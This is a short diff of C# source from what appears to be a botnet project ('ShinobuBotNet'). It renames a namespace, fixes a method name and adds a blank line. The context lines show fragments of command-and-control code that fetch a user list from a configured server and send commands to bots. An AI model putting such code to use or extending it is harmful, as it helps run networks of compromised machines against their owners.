@@ -4,7 +4,7 @@ using System.Linq;
 using System.Net;
 using System.Text;
 
-namespace ShinobuBotNet
+namespace ShinobuBotNetAPI
 {
     class API
     {
@@ -38,7 +38,7 @@ namespace ShinobuBotNet
             }
         }
 
-        public static void creat_cheak_File()
+        public static void create_cheak_File()
         {
             System.IO.File.Create("c0n0ct.ch");
         }
@@ -64,6 +64,7 @@ namespace ShinobuBotNet
             string list = wc.DownloadString(configs.server + "getusers.php");
             return list;
         }
+        
         public static string SendCommand(string id, string type, string content)
         {
             WebClient wc = new WebClient();
